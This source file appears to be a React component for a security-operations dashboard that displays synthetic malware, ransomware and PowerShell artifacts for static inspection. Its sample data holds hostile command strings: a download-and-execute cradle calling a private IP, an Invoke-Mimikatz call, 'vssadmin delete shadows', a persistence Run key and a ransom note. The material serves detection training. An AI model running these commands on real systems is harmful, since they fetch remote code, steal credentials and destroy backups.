import React, { useState, useEffect } from "react";
import { useSOC } from "../context/SOCContext";
import {
  FileCode2,
  Copy,
  Check,
  Cpu,
  RefreshCw,
  AlertOctagon,
  ShieldCheck,
  AlertTriangle,
  FileSearch,
  HardDrive,
  Download,
  Search,
  Layers
} from "lucide-react";
import { socApi } from "../services/api";

interface DemoArtifact {
  id: string;
  name: string;
  file_name: string;
  file_path: string;
  category: string;
  threat_status: string;
  severity: string;
  confidence: number;
  process_name: string;
  user: string;
  size_bytes: number;
  sha256_hash: string;
  reasons: string[];
  evidence: string[];
  content: string;
  hex_dump?: string;
}

const SAMPLE_ARTIFACTS: DemoArtifact[] = [
  {
    id: "art-01",
    name: "Malware Simulation Binary",
    file_name: "malware_simulation.exe",
    file_path: "monitored_workspace/bin/malware_simulation.exe",
    category: "Malware",
    threat_status: "THREAT",
    severity: "HIGH",
    confidence: 96,
    process_name: "cmd.exe",
    user: "NT AUTHORITY\\SYSTEM",
    size_bytes: 524288,
    sha256_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    reasons: [
      "Executable binary created in monitored workspace directory",
      "High entropy binary payload structure (.text2 section)",
      "Unregistered background process spawn"
    ],
    evidence: [
      "PE Header anomaly: Suspicious section names (.text2, .rsrc_fake)",
      "Process spawn attempt: cmd.exe invoked with silent switches"
    ],
    content: `// SAFE SYNTHETIC DEMO ARTIFACT - MALWARE SIMULATION
// Simulated Malware Binary Payload Metadata (Zero Execution)
[HEADER]
magic=0x5A4D (MZ)
pe_offset=0x00000080
sections=.text, .data, .rsrc_fake, .text2
entrypoint=0x00401000
image_base=0x00400000

[SUSPICIOUS_IMPORTS]
KERNEL32.dll: VirtualAllocEx
KERNEL32.dll: WriteProcessMemory
KERNEL32.dll: CreateRemoteThread
WS2_32.dll: WSAConnect

[SIMULATED_BEHAVIOR]
action=spawn_process
target=cmd.exe /c start /min powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=
persistence=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater_service
c2_channel=192.168.1.105:4444`,
    hex_dump: `00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|
00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 80 00 00 00  |................|
00000040  0e 1f ba 0e 00 b4 09 cd  21 b8 01 4c cd 21 54 68  |........!..L.!Th|
00000050  69 73 20 70 72 6f 67 72  61 6d 20 63 61 6e 6e 6f  |is program canno|
00000060  74 20 62 65 20 72 75 6e  20 69 6e 20 44 4f 53 20  |t be run in DOS |
00000070  6d 6f 64 65 2e 0d 0d 0a  24 00 00 00 00 00 00 00  |mode....$.......|
00000080  50 45 00 00 4c 01 04 00  f3 7d 5a 62 00 00 00 00  |PE..L....}Zb....|`
  },
  {
    id: "art-02",
    name: "Ransomware Note & Script",
    file_name: "ransomware_simulation.txt",
    file_path: "monitored_workspace/docs/ransomware_simulation.txt",
    category: "Ransomware",
    threat_status: "THREAT",
    severity: "CRITICAL",
    confidence: 98,
    process_name: "encryptor_demo.exe",
    user: "SYSTEM",
    size_bytes: 1048576,
    sha256_hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
    reasons: [
      "Bulk high-frequency file modification detected by FIM Watchdog",
      "Shadow copy deletion routine",
      "RSA-4096 key exchange header detected"
    ],
    evidence: [
      "Command: vssadmin delete shadows /all /quiet",
      "Entropy score spike: 7.92 / 8.00"
    ],
    content: `--- ALL YOUR FILES ARE ENCRYPTED ---
Your sensitive database backups, personal documents, and financial records have been encrypted with AES-256 and RSA-4096.

To decrypt your files, contact the support address:
KEY_ID: RAGSEC-SIM-9921-X9A
BTC_WALLET: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Do not rename encrypted files or attempt decryption with third-party software.
System State: WS-ANALYST-104 (Subnet 192.168.1.0/24)`,
    hex_dump: `00000000  2d 2d 2d 20 41 4c 4c 20  59 4f 55 52 20 46 49 4c  |--- ALL YOUR FIL|
00000010  45 53 20 41 52 45 20 45  4e 43 52 59 50 54 45 44  |ES ARE ENCRYPTED|
00000020  20 2d 2d 2d 0a 59 6f 75  72 20 73 65 6e 73 69 74  | ---.Your sensit|
00000030  69 76 65 20 64 61 74 61  62 61 73 65 20 62 61 63  |ive database bac|
00000040  6b 75 70 73 2c 20 70 65  72 73 6f 6e 61 6c 20 64  |kups, personal d|`
  },
  {
    id: "art-03",
    name: "Suspicious PowerShell Script",
    file_name: "suspicious_script.ps1",
    file_path: "monitored_workspace/scripts/suspicious_script.ps1",
    category: "Suspicious Script / Execution",
    threat_status: "SUSPICIOUS",
    severity: "MEDIUM",
    confidence: 84,
    process_name: "powershell.exe",
    user: "CORP\\Administrator",
    size_bytes: 4096,
    sha256_hash: "2c624232cdd221771294dfbb310aca000a0df6ec9b5feb9bb7dd73cc4f8530c0",
    reasons: [
      "Base64 encoded command string execution",
      "DownloadString invocation targeting remote external IP"
    ],
    evidence: [
      "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.105:8000/payload.ps1')"
    ],
    content: `# Suspicious Execution Script
$wc = New-Object System.Net.WebClient
$url = "http://192.168.1.105:8000/stage2.bin"
$bytes = $wc.DownloadData($url)
[System.Reflection.Assembly]::Load($bytes)
Invoke-Expression -Command "Start-Sleep -s 10; Invoke-Mimikatz"`,
    hex_dump: `00000000  23 20 53 75 73 70 69 63  69 6f 75 73 20 45 78 65  |# Suspicious Exe|
00000010  63 75 74 69 6f 6e 20 53  63 72 69 70 74 0a 24 77  |cution Script.$w|
00000020  63 20 3d 20 4e 65 77 2d  4f 62 6a 65 63 74 20 53  |c = New-Object S|
00000030  79 73 74 65 6d 2e 4e 65  74 2e 57 65 62 43 6c 69  |ystem.Net.WebCli|`
  }
];

export const CodeExplorer: React.FC = () => {
  const [artifacts, setArtifacts] = useState<DemoArtifact[]>(SAMPLE_ARTIFACTS);
  const [selectedArtifact, setSelectedArtifact] = useState<DemoArtifact>(SAMPLE_ARTIFACTS[0]);
  const [viewMode, setViewMode] = useState<"code" | "hex">("code");
  const [copied, setCopied] = useState(false);
  const [filter, setFilter] = useState("");

  const handleCopy = () => {
    const textToCopy = viewMode === "code" ? selectedArtifact.content : (selectedArtifact.hex_dump || selectedArtifact.content);
    navigator.clipboard.writeText(textToCopy);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const filteredArtifacts = artifacts.filter(a =>
    a.name.toLowerCase().includes(filter.toLowerCase()) ||
    a.file_name.toLowerCase().includes(filter.toLowerCase()) ||
    a.category.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="modern-card p-6 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <span className="text-xs font-mono uppercase tracking-wider text-[#64748B]">Payload Inspector</span>
            <span className="text-neutral-300">•</span>
            <span className="text-xs font-semibold text-blue-600 bg-blue-50 px-2 py-0.5 rounded-full border border-blue-100">
              Zero-Execution Sandbox
            </span>
          </div>
          <h2 className="text-2xl font-bold text-black tracking-tight">
            Code, Disassembly & Hex Stream Explorer
          </h2>
          <p className="text-xs text-[#475569] mt-1 max-w-2xl">
            Safely examine decompiled script logic, binary PE headers, and raw hexadecimal streams without executing untrusted code on analyst workstations.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <div className="flex bg-neutral-100 p-1 rounded-xl">
            <button
              onClick={() => setViewMode("code")}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                viewMode === "code" ? "bg-white text-black shadow-sm" : "text-[#64748B] hover:text-black"
              }`}
            >
              Source / Disasm
            </button>
            <button
              onClick={() => setViewMode("hex")}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                viewMode === "hex" ? "bg-white text-black shadow-sm" : "text-[#64748B] hover:text-black"
              }`}
            >
              Hex Stream
            </button>
          </div>

          <button onClick={handleCopy} className="btn-secondary-white py-2 px-3">
            {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
            <span>{copied ? "Copied" : "Copy Payload"}</span>
          </button>
        </div>
      </div>

      {/* Main 2-Column Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Left 1 Col: Artifacts List */}
        <div className="modern-card p-4 space-y-3">
          <div className="relative">
            <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-[#94A3B8]" />
            <input
              type="text"
              placeholder="Filter artifacts..."
              value={filter}
              onChange={e => setFilter(e.target.value)}
              className="w-full bg-neutral-50 border border-neutral-200 rounded-lg pl-8 pr-3 py-1.5 text-xs font-mono text-black placeholder:text-[#94A3B8] focus:outline-none focus:border-black"
            />
          </div>

          <div className="space-y-1.5">
            {filteredArtifacts.map(art => {
              const isSelected = selectedArtifact.id === art.id;

              return (
                <div
                  key={art.id}
                  onClick={() => setSelectedArtifact(art)}
                  className={`p-3 rounded-xl border transition-all cursor-pointer ${
                    isSelected
                      ? "bg-black text-white border-black shadow-sm"
                      : "bg-white text-[#334155] border-neutral-100 hover:bg-neutral-50 hover:border-neutral-200"
                  }`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono font-bold truncate">{art.file_name}</span>
                    <span className={`text-[9px] font-bold px-1.5 py-0.2 rounded-md ${
                      art.severity === "CRITICAL"
                        ? "bg-red-500 text-white"
                        : art.severity === "HIGH"
                        ? "bg-amber-500 text-white"
                        : "bg-neutral-200 text-neutral-800"
                    }`}>
                      {art.severity}
                    </span>
                  </div>
                  <div className={`text-[11px] truncate ${isSelected ? "text-neutral-300" : "text-[#64748B]"}`}>
                    {art.category}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right 3 Cols: Code/Hex Viewer & Analysis */}
        <div className="lg:col-span-3 space-y-4">
          {/* Metadata Bar */}
          <div className="modern-card p-4 grid grid-cols-2 sm:grid-cols-4 gap-4 text-xs font-mono">
            <div>
              <span className="text-[#64748B] block text-[10px]">FILE PATH</span>
              <span className="font-semibold text-black truncate block">{selectedArtifact.file_path}</span>
            </div>
            <div>
              <span className="text-[#64748B] block text-[10px]">SHA-256</span>
              <span className="font-semibold text-black truncate block">{selectedArtifact.sha256_hash.slice(0, 16)}...</span>
            </div>
            <div>
              <span className="text-[#64748B] block text-[10px]">SIZE / ENTROPY</span>
              <span className="font-semibold text-black">{(selectedArtifact.size_bytes / 1024).toFixed(1)} KB (High)</span>
            </div>
            <div>
              <span className="text-[#64748B] block text-[10px]">CONFIDENCE</span>
              <span className="font-bold text-emerald-600">{selectedArtifact.confidence}% Grounded</span>
            </div>
          </div>

          {/* Editor Container */}
          <div className="modern-card overflow-hidden border border-neutral-200 bg-[#0F172A] text-neutral-100">
            <div className="bg-[#1E293B] px-4 py-2.5 flex items-center justify-between border-b border-neutral-700 text-xs font-mono">
              <div className="flex items-center gap-2">
                <FileCode2 className="w-4 h-4 text-blue-400" />
                <span className="text-white font-bold">{selectedArtifact.file_name}</span>
                <span className="text-[#94A3B8]">({viewMode.toUpperCase()})</span>
              </div>
              <div className="flex items-center gap-3 text-[11px] text-[#94A3B8]">
                <span>UTF-8</span>
                <span>Read-Only Sandbox</span>
              </div>
            </div>

            <pre className="p-4 font-mono text-xs overflow-x-auto leading-relaxed max-h-[460px] text-neutral-200 selection:bg-blue-600 selection:text-white">
              {viewMode === "code" ? selectedArtifact.content : (selectedArtifact.hex_dump || selectedArtifact.content)}
            </pre>
          </div>

          {/* Behavioral Reasons & Evidence */}
          <div className="modern-card p-5 space-y-3">
            <h4 className="text-xs font-bold uppercase tracking-wider text-black font-mono">
              Zero-Execution Static Evidence
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="p-3 rounded-xl bg-neutral-50 border border-neutral-100">
                <span className="text-[10px] font-mono text-[#64748B] block mb-1">TRIGGER INDICATORS</span>
                <ul className="text-xs text-[#334155] space-y-1 list-disc list-inside">
                  {selectedArtifact.reasons.map((r, i) => (
                    <li key={i}>{r}</li>
                  ))}
                </ul>
              </div>
              <div className="p-3 rounded-xl bg-neutral-50 border border-neutral-100">
                <span className="text-[10px] font-mono text-[#64748B] block mb-1">STATIC EXTRACTIONS</span>
                <ul className="text-xs text-[#334155] space-y-1 list-disc list-inside">
                  {selectedArtifact.evidence.map((e, i) => (
                    <li key={i}>{e}</li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
export default CodeExplorer;
